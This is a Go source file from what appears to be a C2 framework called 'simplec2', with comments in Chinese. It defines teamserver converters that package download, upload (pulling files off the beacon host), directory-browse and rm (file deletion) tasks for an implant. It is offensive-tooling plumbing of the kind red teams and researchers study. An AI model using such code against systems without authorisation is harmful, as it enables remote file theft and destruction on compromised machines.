package commands

import (
	"encoding/json"
	"fmt"
	"os"

	"simplec2/pkg/logger"
	"simplec2/teamserver/data"
)

// CommandIDFile 统一文件操作命令 ID
const CommandIDFile uint32 = 10

// ChunkSize 文件分块大小（需与 constants.go 保持一致）
const ChunkSize = 1024 * 1024 // 1MB

// FileConvertResult 文件命令转换结果
type FileConvertResult struct {
	Args           []byte
	NeedBroadcast  bool
	BroadcastEvent []byte
	Skip           bool // 是否跳过此任务
}

// downloadConverter 处理 download 命令
type downloadConverter struct{}

func init() {
	Register(&downloadConverter{})
	Register(&uploadConverter{})
	Register(&browseConverter{})
	Register(&rmConverter{})
}

func (c *downloadConverter) Name() string {
	return "download"
}

func (c *downloadConverter) CommandID() uint32 {
	return CommandIDFile
}

func (c *downloadConverter) Convert(task *data.Task) ([]byte, error) {
	if task.Arguments == "" {
		logger.Warnf("Download task %s has no arguments", task.TaskID)
		return nil, fmt.Errorf("download task has no arguments")
	}

	var downloadArgs struct {
		Source      string `json:"source"`
		Destination string `json:"destination"`
	}
	if err := json.Unmarshal([]byte(task.Arguments), &downloadArgs); err != nil {
		return nil, fmt.Errorf("failed to parse download arguments: %v", err)
	}

	fileInfo, err := os.Stat(downloadArgs.Source)
	if err != nil {
		return nil, fmt.Errorf("failed to get file info for %s: %v", downloadArgs.Source, err)
	}

	// 准备 beacon 端需要的统一文件操作参数
	fileOpArgs := map[string]interface{}{
		"action":      "download",
		"source":      downloadArgs.Source,
		"destination": downloadArgs.Destination,
		"file_size":   fileInfo.Size(),
		"chunk_size":  ChunkSize,
	}

	return json.Marshal(fileOpArgs)
}

// uploadConverter 处理 upload 命令（从 beacon 读取文件）
type uploadConverter struct{}

func (c *uploadConverter) Name() string {
	return "upload"
}

func (c *uploadConverter) CommandID() uint32 {
	return CommandIDFile
}

func (c *uploadConverter) Convert(task *data.Task) ([]byte, error) {
	fileOpArgs := map[string]string{
		"action": "upload",
		"path":   task.Arguments,
	}
	return json.Marshal(fileOpArgs)
}

// browseConverter 处理 browse 命令
type browseConverter struct{}

func (c *browseConverter) Name() string {
	return "browse"
}

func (c *browseConverter) CommandID() uint32 {
	return CommandIDFile
}

func (c *browseConverter) Convert(task *data.Task) ([]byte, error) {
	fileOpArgs := map[string]string{
		"action": "list",
		"path":   task.Arguments,
	}
	return json.Marshal(fileOpArgs)
}

// rmConverter 处理 rm 命令
type rmConverter struct{}

func (c *rmConverter) Name() string {
	return "rm"
}

func (c *rmConverter) CommandID() uint32 {
	return CommandIDFile
}

func (c *rmConverter) Convert(task *data.Task) ([]byte, error) {
	fileOpArgs := map[string]string{
		"action": "rm",
		"path":   task.Arguments,
	}
	return json.Marshal(fileOpArgs)
}
